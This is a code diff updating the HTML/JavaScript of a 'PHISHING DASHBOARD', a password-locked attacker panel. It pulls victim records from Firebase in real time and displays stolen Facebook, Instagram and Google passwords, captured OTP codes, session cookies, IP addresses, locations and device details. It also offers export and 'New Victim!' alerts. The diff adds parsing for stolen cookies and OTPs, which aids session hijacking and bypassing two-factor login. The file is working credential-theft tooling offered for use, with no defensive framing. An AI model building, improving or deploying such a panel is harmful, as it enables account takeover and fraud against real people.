@@ -1,12 +1,12 @@
 <!-- ═══════════════════════════════════════════════════════════
-     FILE: index.html - ড্যাশবোর্ড v3 (লক + OTP + কুকি)
+     FILE: index.html - ড্যাশবোর্ড v4 (ফিক্সড + অ্যাডভান্সড)
      ═══════════════════════════════════════════════════════════ -->
 <!DOCTYPE html>
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔐 Secure Dashboard - Login Required</title>
+    <title>🔐 Secure Dashboard - AhmedTasnimX</title>
     
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
@@ -23,6 +23,7 @@
             --cyan: #8be9fd;
             --purple: #bd93f9;
             --orange: #ff9800;
+            --pink: #ff6b9d;
         }
         
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -39,21 +40,12 @@
            ════════════════════════════════════════════ */
         .lock-screen {
             position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
+            top: 0; left: 0; right: 0; bottom: 0;
             background: linear-gradient(135deg, #0a0a0f 0%, #1a0a1f 30%, #0f0a1a 60%, #0a0a0f 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 9999;
-            animation: lockFadeIn 0.5s ease;
-        }
-        
-        @keyframes lockFadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
         }
         
         .lock-card {
@@ -65,37 +57,13 @@
             max-width: 400px;
             width: 90%;
             box-shadow: 0 20px 60px rgba(189,147,249,0.2);
-            animation: lockSlide 0.6s ease;
         }
         
-        @keyframes lockSlide {
-            from { transform: translateY(-30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
+        .lock-icon { font-size: 60px; margin-bottom: 20px; animation: lockPulse 2s infinite; }
+        @keyframes lockPulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.1);} }
         
-        .lock-icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-            animation: lockPulse 2s infinite;
-        }
-        
-        @keyframes lockPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-        
-        .lock-title {
-            font-size: 22px;
-            color: var(--purple);
-            margin-bottom: 10px;
-            letter-spacing: 2px;
-        }
-        
-        .lock-subtitle {
-            color: rgba(255,255,255,0.5);
-            font-size: 13px;
-            margin-bottom: 25px;
-        }
+        .lock-title { font-size: 22px; color: var(--purple); margin-bottom: 10px; letter-spacing: 2px; }
+        .lock-subtitle { color: rgba(255,255,255,0.5); font-size: 13px; margin-bottom: 25px; }
         
         .lock-input {
             width: 100%;
@@ -112,11 +80,7 @@
             outline: none;
             transition: border-color 0.3s;
         }
-        
-        .lock-input:focus {
-            border-color: var(--purple);
-            box-shadow: 0 0 15px rgba(189,147,249,0.3);
-        }
+        .lock-input:focus { border-color: var(--purple); box-shadow: 0 0 15px rgba(189,147,249,0.3); }
         
         .lock-btn {
             width: 100%;
@@ -129,40 +93,19 @@
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            letter-spacing: 1px;
-            transition: all 0.3s;
         }
+        .lock-btn:hover { box-shadow: 0 10px 30px rgba(189,147,249,0.4); }
         
-        .lock-btn:hover {
-            box-shadow: 0 10px 30px rgba(189,147,249,0.4);
-            transform: translateY(-2px);
-        }
+        .lock-error { color: var(--red); font-size: 13px; margin-top: 10px; display: none; }
         
-        .lock-error {
-            color: var(--red);
-            font-size: 13px;
-            margin-top: 10px;
-            display: none;
-        }
-        
-        .lock-footer {
-            margin-top: 20px;
-            color: rgba(255,255,255,0.3);
-            font-size: 11px;
-        }
+        .lock-footer { margin-top: 20px; color: rgba(255,255,255,0.3); font-size: 11px; }
         
         /* ════════════════════════════════════════════
-           MAIN DASHBOARD
+           DASHBOARD
            ════════════════════════════════════════════ */
         .dashboard {
             display: none;
             padding: 20px;
-            animation: dashboardFade 0.5s ease;
-        }
-        
-        @keyframes dashboardFade {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
         }
         
         .header {
@@ -178,53 +121,30 @@
             gap: 15px;
         }
         
-        .header h1 {
-            color: var(--green);
-            font-size: 24px;
-            letter-spacing: 2px;
-        }
+        .header h1 { color: var(--green); font-size: 24px; letter-spacing: 2px; }
         
-        .header-info {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
+        .header-info { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
         
-        .live-indicator {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
+        .live-indicator { display: flex; align-items: center; gap: 8px; }
+        .live-dot { width: 10px; height: 10px; background: var(--green); border-radius: 50%; animation: blink 1s infinite; }
+        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
         
-        .live-dot {
-            width: 10px;
-            height: 10px;
-            background: var(--green);
-            border-radius: 50%;
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        
-        .logout-btn {
-            padding: 8px 16px;
-            background: var(--red);
-            color: white;
+        .export-btn, .logout-btn {
+            padding: 9px 16px;
             border: none;
             border-radius: 8px;
             cursor: pointer;
             font-family: inherit;
             font-size: 12px;
+            font-weight: bold;
         }
+        .export-btn { background: var(--cyan); color: var(--bg); }
+        .logout-btn { background: var(--red); color: white; }
         
         /* Stats */
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
             gap: 12px;
             margin-bottom: 20px;
         }
@@ -238,53 +158,9 @@
             cursor: pointer;
             transition: all 0.3s;
         }
-        
-        .stat-card:hover {
-            border-color: var(--green);
-            transform: translateY(-2px);
-        }
-        
-        .stat-card .number {
-            font-size: 32px;
-            font-weight: bold;
-            color: var(--gold);
-        }
-        
-        .stat-card .label {
-            color: rgba(255,255,255,0.6);
-            font-size: 11px;
-            margin-top: 5px;
-        }
-        
-        /* Tabs */
-        .tabs {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-        }
-        
-        .tab-btn {
-            padding: 9px 16px;
-            background: var(--panel);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            color: white;
-            cursor: pointer;
-            font-family: inherit;
-            font-size: 13px;
-            transition: all 0.3s;
-        }
-        
-        .tab-btn.active {
-            background: var(--green);
-            color: var(--bg);
-            font-weight: bold;
-        }
-        
-        .tab-btn:hover {
-            border-color: var(--green);
-        }
+        .stat-card:hover { border-color: var(--green); transform: translateY(-2px); }
+        .stat-card .number { font-size: 30px; font-weight: bold; color: var(--gold); }
+        .stat-card .label { color: rgba(255,255,255,0.6); font-size: 11px; margin-top: 5px; }
         
         /* Search */
         .search-bar {
@@ -299,12 +175,25 @@
             margin-bottom: 15px;
             outline: none;
         }
+        .search-bar:focus { border-color: var(--green); }
         
-        .search-bar:focus {
-            border-color: var(--green);
+        /* Tabs */
+        .tabs { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
+        .tab-btn {
+            padding: 9px 16px;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 13px;
+            transition: all 0.3s;
         }
+        .tab-btn.active { background: var(--green); color: var(--bg); font-weight: bold; }
+        .tab-btn:hover { border-color: var(--green); }
         
-        /* Victim list */
+        /* Victim Card */
         .victim-list {
             background: var(--panel);
             border: 1px solid var(--border);
@@ -318,12 +207,6 @@
             border-radius: 10px;
             padding: 18px;
             margin-bottom: 12px;
-            animation: slideIn 0.5s ease-out;
-        }
-        
-        @keyframes slideIn {
-            from { transform: translateX(-20px); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
         }
         
         .victim-header {
@@ -342,12 +225,10 @@
             border-radius: 20px;
             font-size: 11px;
             font-weight: bold;
+            text-transform: uppercase;
         }
         
-        .victim-time {
-            font-size: 11px;
-            color: rgba(255,255,255,0.5);
-        }
+        .victim-time { font-size: 11px; color: rgba(255,255,255,0.5); }
         
         .victim-info {
             display: grid;
@@ -360,34 +241,19 @@
             padding: 10px;
             border-radius: 8px;
         }
+        .info-item .key { color: rgba(255,255,255,0.5); font-size: 10px; text-transform: uppercase; letter-spacing: 1px; }
+        .info-item .value { color: #fff; font-size: 13px; margin-top: 3px; word-break: break-all; }
         
-        .info-item .key {
-            color: rgba(255,255,255,0.5);
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .info-item .value {
-            color: #fff;
-            font-size: 13px;
-            margin-top: 3px;
-            word-break: break-all;
-        }
-        
-        /* OTP Badge */
         .otp-badge {
             display: inline-block;
             padding: 3px 8px;
             background: var(--orange);
             color: var(--bg);
             border-radius: 4px;
-            font-size: 11px;
+            font-size: 10px;
             font-weight: bold;
-            margin-left: 5px;
         }
         
-        /* Cookie Badge */
         .cookie-badge {
             display: inline-block;
             padding: 3px 8px;
@@ -396,15 +262,9 @@
             border-radius: 4px;
             font-size: 10px;
             font-weight: bold;
-            margin-left: 5px;
         }
         
-        .no-victims {
-            text-align: center;
-            padding: 40px;
-            color: rgba(255,255,255,0.3);
-            font-size: 15px;
-        }
+        .no-victims { text-align: center; padding: 40px; color: rgba(255,255,255,0.3); font-size: 15px; }
         
         .delete-btn {
             padding: 5px 10px;
@@ -416,63 +276,35 @@
             font-size: 11px;
             font-family: inherit;
         }
-        
-        .export-btn {
-            padding: 10px 18px;
-            background: var(--cyan);
-            color: var(--bg);
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-family: inherit;
-            font-weight: bold;
-        }
-        
-        .export-btn:hover {
-            opacity: 0.9;
-        }
     </style>
 </head>
 <body>
-    <!-- ════════════════════════════════════════════
-         LOCK SCREEN
-         ════════════════════════════════════════════ -->
+    <!-- LOCK SCREEN -->
     <div class="lock-screen" id="lockScreen">
         <div class="lock-card">
             <div class="lock-icon">🔐</div>
             <div class="lock-title">SECURE DASHBOARD</div>
             <div class="lock-subtitle">Enter password to access</div>
-            
-            <input type="password" class="lock-input" id="lockPassword" 
-                   placeholder="••••••••••" autocomplete="off">
-            
+            <input type="password" class="lock-input" id="lockPassword" placeholder="••••••••••" autocomplete="off">
             <button class="lock-btn" onclick="checkPassword()">UNLOCK</button>
-            
             <div class="lock-error" id="lockError">❌ Wrong password!</div>
-            
             <div class="lock-footer">
                 Developed by <span style="color:var(--purple);font-weight:bold;">AhmedTasnimX</span>
             </div>
         </div>
     </div>
     
-    <!-- ════════════════════════════════════════════
-         MAIN DASHBOARD
-         ════════════════════════════════════════════ -->
+    <!-- DASHBOARD -->
     <div class="dashboard" id="dashboard">
-        <!-- Header -->
         <div class="header">
             <div>
                 <h1>🎯 PHISHING DASHBOARD</h1>
                 <p style="color:rgba(255,255,255,0.5);font-size:11px;">
-                    Real-time victim monitoring | Developed by <span style="color:var(--purple);">AhmedTasnimX</span>
+                    Real-time monitoring | <span style="color:var(--purple);">AhmedTasnimX</span>
                 </p>
             </div>
             <div class="header-info">
-                <div class="live-indicator">
-                    <div class="live-dot"></div>
-                    <span style="color:var(--green);font-size:12px;">LIVE</span>
-                </div>
+                <div class="live-indicator"><div class="live-dot"></div><span style="color:var(--green);font-size:12px;">LIVE</span></div>
                 <button class="export-btn" onclick="exportData()">📥 Export</button>
                 <button class="logout-btn" onclick="logout()">🚪 Logout</button>
             </div>
@@ -480,68 +312,42 @@
         
         <!-- Stats -->
         <div class="stats-grid">
-            <div class="stat-card" onclick="filterByPlatform('all')">
-                <div class="number" id="totalVictims">0</div>
-                <div class="label">Total Victims</div>
-            </div>
-            <div class="stat-card" onclick="filterByPlatform('facebook')">
-                <div class="number" id="facebookCount">0</div>
-                <div class="label">Facebook</div>
-            </div>
-            <div class="stat-card" onclick="filterByPlatform('instagram')">
-                <div class="number" id="instagramCount">0</div>
-                <div class="label">Instagram</div>
-            </div>
-            <div class="stat-card" onclick="filterByPlatform('google')">
-                <div class="number" id="googleCount">0</div>
-                <div class="label">Google</div>
-            </div>
-            <div class="stat-card" onclick="filterByPlatform('other')">
-                <div class="number" id="otherCount">0</div>
-                <div class="label">Others</div>
-            </div>
-            <div class="stat-card" onclick="filterByOTP()">
-                <div class="number" id="otpCount">0</div>
-                <div class="label">🔑 OTP Captured</div>
-            </div>
-            <div class="stat-card" onclick="filterByCookie()">
-                <div class="number" id="cookieCount">0</div>
-                <div class="label">🍪 Cookies</div>
-            </div>
+            <div class="stat-card" onclick="setFilter('all')"><div class="number" id="totalVictims">0</div><div class="label">Total</div></div>
+            <div class="stat-card" onclick="setFilter('facebook')"><div class="number" id="facebookCount">0</div><div class="label">Facebook</div></div>
+            <div class="stat-card" onclick="setFilter('instagram')"><div class="number" id="instagramCount">0</div><div class="label">Instagram</div></div>
+            <div class="stat-card" onclick="setFilter('google')"><div class="number" id="googleCount">0</div><div class="label">Google</div></div>
+            <div class="stat-card" onclick="setFilter('other')"><div class="number" id="otherCount">0</div><div class="label">Others</div></div>
+            <div class="stat-card" onclick="setFilter('otp')"><div class="number" id="otpCount">0</div><div class="label">🔑 OTP</div></div>
+            <div class="stat-card" onclick="setFilter('cookie')"><div class="number" id="cookieCount">0</div><div class="label">🍪 Cookie</div></div>
         </div>
         
         <!-- Search -->
-        <input type="text" class="search-bar" id="searchInput" 
-               placeholder="🔍 Search by email, IP, phone, OTP..." 
-               onkeyup="searchVictims(this.value)">
+        <input type="text" class="search-bar" id="searchInput" placeholder="🔍 Search by email, IP, phone, OTP, cookie..." onkeyup="searchVictims(this.value)">
         
         <!-- Tabs -->
         <div class="tabs" id="tabsContainer">
-            <button class="tab-btn active" data-filter="all" onclick="filterByPlatform('all')">All</button>
-            <button class="tab-btn" data-filter="facebook" onclick="filterByPlatform('facebook')">Facebook</button>
-            <button class="tab-btn" data-filter="instagram" onclick="filterByPlatform('instagram')">Instagram</button>
-            <button class="tab-btn" data-filter="google" onclick="filterByPlatform('google')">Google</button>
-            <button class="tab-btn" data-filter="other" onclick="filterByPlatform('other')">Others</button>
-            <button class="tab-btn" data-filter="otp" onclick="filterByOTP()">🔑 OTP</button>
-            <button class="tab-btn" data-filter="cookie" onclick="filterByCookie()">🍪 Cookie</button>
+            <button class="tab-btn active" data-filter="all" onclick="setFilter('all')">All</button>
+            <button class="tab-btn" data-filter="facebook" onclick="setFilter('facebook')">Facebook</button>
+            <button class="tab-btn" data-filter="instagram" onclick="setFilter('instagram')">Instagram</button>
+            <button class="tab-btn" data-filter="google" onclick="setFilter('google')">Google</button>
+            <button class="tab-btn" data-filter="other" onclick="setFilter('other')">Others</button>
+            <button class="tab-btn" data-filter="otp" onclick="setFilter('otp')">🔑 OTP</button>
+            <button class="tab-btn" data-filter="cookie" onclick="setFilter('cookie')">🍪 Cookie</button>
         </div>
         
         <!-- Victim List -->
         <div class="victim-list">
             <h3 style="margin-bottom:15px;color:var(--red);">📋 VICTIM RECORDS</h3>
-            <div id="victimContainer">
-                <div class="no-victims">⏳ Waiting for victims...</div>
-            </div>
+            <div id="victimContainer"><div class="no-victims">⏳ Waiting...</div></div>
         </div>
     </div>
     
-    <!-- Firebase Init -->
+    <!-- Config + Logic -->
     <script src="./config.js"></script>
     <script>
         // ════════════════════════════════════════════
-        // LOCK SCREEN LOGIC
+        // LOCK SCREEN
         // ════════════════════════════════════════════
-        
         const CORRECT_PASSWORD = "Sorwer Sir";
         
         function checkPassword() {
@@ -549,56 +355,42 @@
             const error = document.getElementById('lockError');
             
             if (input === CORRECT_PASSWORD) {
-                // Unlock dashboard
                 document.getElementById('lockScreen').style.display = 'none';
                 document.getElementById('dashboard').style.display = 'block';
-                
-                // Init Firebase after unlock
                 initFirebase();
-                
-                // Save session
-                sessionStorage.setItem('dashboard_unlocked', 'true');
+                sessionStorage.setItem('dx_unlocked', 'true');
             } else {
                 error.style.display = 'block';
                 document.getElementById('lockPassword').value = '';
                 document.getElementById('lockPassword').focus();
-                
-                // Shake animation
-                const card = document.querySelector('.lock-card');
-                card.style.animation = 'none';
-                setTimeout(() => {
-                    card.style.animation = 'lockSlide 0.6s ease';
-                }, 10);
             }
         }
         
-        // Enter key handler
         document.getElementById('lockPassword').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                checkPassword();
-            }
+            if (e.key === 'Enter') checkPassword();
         });
         
         function logout() {
-            sessionStorage.removeItem('dashboard_unlocked');
+            sessionStorage.removeItem('dx_unlocked');
             document.getElementById('dashboard').style.display = 'none';
             document.getElementById('lockScreen').style.display = 'flex';
             document.getElementById('lockPassword').value = '';
             document.getElementById('lockError').style.display = 'none';
         }
         
-        // Check session on load
-        if (sessionStorage.getItem('dashboard_unlocked') === 'true') {
+        if (sessionStorage.getItem('dx_unlocked') === 'true') {
             document.getElementById('lockScreen').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
             initFirebase();
         }
         
         // ════════════════════════════════════════════
-        // FIREBASE INIT
+        // FIREBASE
         // ════════════════════════════════════════════
-        
         let database = null;
+        let allVictims = {};
+        let currentFilter = 'all';
+        let currentSearch = '';
         
         function initFirebase() {
             if (database) return;
@@ -606,13 +398,11 @@
             firebase.initializeApp(window.firebaseConfig);
             database = firebase.database();
             
-            // Real-time listener
             database.ref('victims').on('value', (snapshot) => {
                 allVictims = snapshot.val() || {};
                 renderVictims();
             });
             
-            // New victim alert
             database.ref('victims').on('child_added', (snapshot) => {
                 const victim = snapshot.val();
                 showNotification(victim);
@@ -621,112 +411,142 @@
         }
         
         // ════════════════════════════════════════════
-        // STATE
+        // HELPERS
         // ════════════════════════════════════════════
         
-        let allVictims = {};
-        let currentFilter = 'all';
-        let currentSearch = '';
+        // কুকি অবজেক্ট বা স্ট্রিং — দুটোই হ্যান্ডেল করবে
+        function getCookieString(v) {
+            if (!v) return '';
+            
+            // Direct string
+            if (typeof v.cookies === 'string' && v.cookies.length > 0) return v.cookies;
+            if (typeof v.cookieData === 'string' && v.cookieData.length > 0) return v.cookieData;
+            if (typeof v.cookieString === 'string' && v.cookieString.length > 0) return v.cookieString;
+            
+            // Object
+            if (v.cookies && typeof v.cookies === 'object') {
+                const entries = Object.entries(v.cookies);
+                if (entries.length > 0) {
+                    return entries.map(([k, val]) => k + '=' + val).join('; ');
+                }
+            }
+            if (v.cookieData && typeof v.cookieData === 'object') {
+                const entries = Object.entries(v.cookieData);
+                if (entries.length > 0) {
+                    return entries.map(([k, val]) => k + '=' + val).join('; ');
+                }
+            }
+            return '';
+        }
+        
+        function hasCookie(v) {
+            return getCookieString(v).length > 0;
+        }
+        
+        function getOTP(v) {
+            return v.otp || v.otpCode || v.otp_input || '';
+        }
+        
+        function hasOTP(v) {
+            return getOTP(v).length > 0;
+        }
+        
+        function getIP(v) {
+            return v.ipInfo?.ip || v.ip || v.ipAddress || 'N/A';
+        }
+        
+        // ════════════════════════════════════════════
+        // RENDER
+        // ════════════════════════════════════════════
         
         function renderVictims() {
             const container = document.getElementById('victimContainer');
-            const victimIds = Object.keys(allVictims);
+            const ids = Object.keys(allVictims);
             
             updateStats();
             
-            let filteredIds = victimIds.filter(id => {
+            let filtered = ids.filter(id => {
                 const v = allVictims[id];
                 if (!v) return false;
                 
-                // Platform filter
-                if (currentFilter === 'otp') {
-                    return v.otp || v.otpCode ? true : false;
-                }
-                if (currentFilter === 'cookie') {
-                    return v.cookies || v.cookieData ? true : false;
-                }
-                if (currentFilter !== 'all') {
-                    if (currentFilter === 'other') {
-                        if (['facebook', 'instagram', 'google'].includes(v.platform)) return false;
-                    } else {
-                        if (v.platform !== currentFilter) return false;
-                    }
-                }
+                if (currentFilter === 'otp') return hasOTP(v);
+                if (currentFilter === 'cookie') return hasCookie(v);
+                if (currentFilter === 'other') return !['facebook','instagram','google'].includes(v.platform);
+                if (currentFilter !== 'all') return v.platform === currentFilter;
                 
-                // Search
                 if (currentSearch) {
                     const searchStr = JSON.stringify(v).toLowerCase();
                     if (!searchStr.includes(currentSearch.toLowerCase())) return false;
                 }
-                
                 return true;
             });
             
-            filteredIds.sort((a, b) => {
+            filtered.sort((a, b) => {
                 return new Date(allVictims[b].timestamp || 0) - new Date(allVictims[a].timestamp || 0);
             });
             
-            if (filteredIds.length === 0) {
+            if (filtered.length === 0) {
                 container.innerHTML = '<div class="no-victims">⏳ No victims found</div>';
                 return;
             }
             
             let html = '';
-            filteredIds.forEach(id => {
-                html += createVictimCard(allVictims[id], id);
-            });
+            filtered.forEach(id => { html += createVictimCard(allVictims[id], id); });
             container.innerHTML = html;
         }
         
         function createVictimCard(v, id) {
             const time = new Date(v.timestamp || Date.now()).toLocaleString();
-            const platformBadge = v.platform || 'unknown';
-            const hasOTP = v.otp || v.otpCode;
-            const hasCookie = v.cookies || v.cookieData;
+            const platform = (v.platform || 'unknown').toUpperCase();
+            const email = v.email || v.username || v.fullName || 'Unknown';
+            const password = v.password || 'N/A';
+            const ip = getIP(v);
+            const location = (v.ipInfo?.city || 'N/A') + ', ' + (v.ipInfo?.country || 'N/A');
+            const isp = v.ipInfo?.isp || 'N/A';
+            const device = (v.deviceInfo?.device || 'N/A') + ' / ' + (v.deviceInfo?.os || 'N/A');
+            const browser = v.deviceInfo?.browser || 'N/A';
+            const otp = getOTP(v);
+            const cookieStr = getCookieString(v);
             
             return `
                 <div class="victim-card">
                     <div class="victim-header">
-                        <span class="victim-platform">${platformBadge.toUpperCase()}</span>
-                        <span style="color:var(--cyan);font-weight:bold;">
-                            ${v.email || v.username || v.fullName || 'Unknown'}
-                        </span>
+                        <span class="victim-platform">${platform}</span>
+                        <span style="color:var(--cyan);font-weight:bold;">${email}</span>
                         <span class="victim-time">${time}</span>
                     </div>
                     <div class="victim-info">
                         <div class="info-item">
                             <div class="key">Password</div>
-                            <div class="value" style="color:var(--red);font-weight:bold;">${v.password || 'N/A'}</div>
+                            <div class="value" style="color:var(--red);font-weight:bold;">${password}</div>
                         </div>
-                        ${hasOTP ? `
-                        <div class="info-item">
-                            <div class="key">OTP Code <span class="otp-badge">CAPTURED</span></div>
-                            <div class="value" style="color:var(--orange);font-weight:bold;">${v.otp || v.otpCode || 'N/A'}</div>
+                        ${otp ? `<div class="info-item">
+                            <div class="key">OTP <span class="otp-badge">CAPTURED</span></div>
+                            <div class="value" style="color:var(--orange);font-weight:bold;">${otp}</div>
                         </div>` : ''}
-                        ${hasCookie ? `
-                        <div class="info-item">
-                            <div class="key">Cookies <span class="cookie-badge">CAPTURED</span></div>
-                            <div class="value" style="font-size:11px;">${(v.cookies || v.cookieData || 'N/A').substring(0, 80)}...</div>
+                        ${cookieStr ? `<div class="info-item">
+                            <div class="key">Cookie <span class="cookie-badge">CAPTURED</span></div>
+                            <div class="value" style="font-size:11px;">${cookieStr.substring(0, 100)}${cookieStr.length > 100 ? '...' : ''}</div>
                         </div>` : ''}
                         <div class="info-item">
-                            <div class="key">IP Address</div>
-                            <div class="value">${v.ipInfo?.ip || v.ip || 'N/A'}</div>
+                            <div class="key">IP</div>
+                            <div class="value">${ip}</div>
                         </div>
                         <div class="info-item">
                             <div class="key">Location</div>
-                            <div class="value">${v.ipInfo?.city || 'N/A'}, ${v.ipInfo?.country || 'N/A'}</div>
+                            <div class="value">${location}</div>
                         </div>
                         <div class="info-item">
                             <div class="key">ISP</div>
-                            <div class="value">${v.ipInfo?.isp || 'N/A'}</div>
+                            <div class="value">${isp}</div>
                         </div>
                         <div class="info-item">
                             <div class="key">Device</div>
-                            <div class="value">${v.deviceInfo?.device || 'N/A'} / ${v.deviceInfo?.os || 'N/A'}</div>
+                            <div class="value">${device}</div>
                         </div>
                         <div class="info-item">
                             <div class="key">Browser</div>
-                            <div class="value">${v.deviceInfo?.browser || 'N/A'}</div>
+                            <div class="value">${browser}</div>
                         </div>
                     </div>
                     <div style="margin-top:10px;text-align:right;">
@@ -748,8 +568,8 @@
                 else if (v.platform === 'google') gg++;
                 else other++;
                 
-                if (v.otp || v.otpCode) otp++;
-                if (v.cookies || v.cookieData) cookie++;
+                if (hasOTP(v)) otp++;
+                if (hasCookie(v)) cookie++;
             });
             
             document.getElementById('totalVictims').textContent = ids.length;
@@ -761,29 +581,15 @@
             document.getElementById('cookieCount').textContent = cookie;
         }
         
-        function filterByPlatform(platform) {
-            currentFilter = platform;
-            document.querySelectorAll('.tab-btn').forEach(btn => {
-                btn.classList.remove('active');
-                if (btn.dataset.filter === platform) btn.classList.add('active');
-            });
-            renderVictims();
-        }
+        // ════════════════════════════════════════════
+        // FILTERS (Fixed)
+        // ════════════════════════════════════════════
         
-        function filterByOTP() {
-            currentFilter = 'otp';
+        function setFilter(filter) {
+            currentFilter = filter;
             document.querySelectorAll('.tab-btn').forEach(btn => {
                 btn.classList.remove('active');
-                if (btn.dataset.filter === 'otp') btn.classList.add('active');
-            });
-            renderVictims();
-        }
-        
-        function filterByCookie() {
-            currentFilter = 'cookie';
-            document.querySelectorAll('.tab-btn').forEach(btn => {
-                btn.classList.remove('active');
-                if (btn.dataset.filter === 'cookie') btn.classList.add('active');
+                if (btn.dataset.filter === filter) btn.classList.add('active');
             });
             renderVictims();
         }
@@ -813,7 +619,7 @@
         function showNotification(victim) {
             if (Notification.permission === 'granted') {
                 new Notification('🎯 New Victim!', {
-                    body: `${victim.platform} - ${victim.email || victim.username || 'Unknown'}`,
+                    body: (victim.platform || 'unknown') + ' - ' + (victim.email || victim.username || 'Unknown'),
                 });
             }
         }
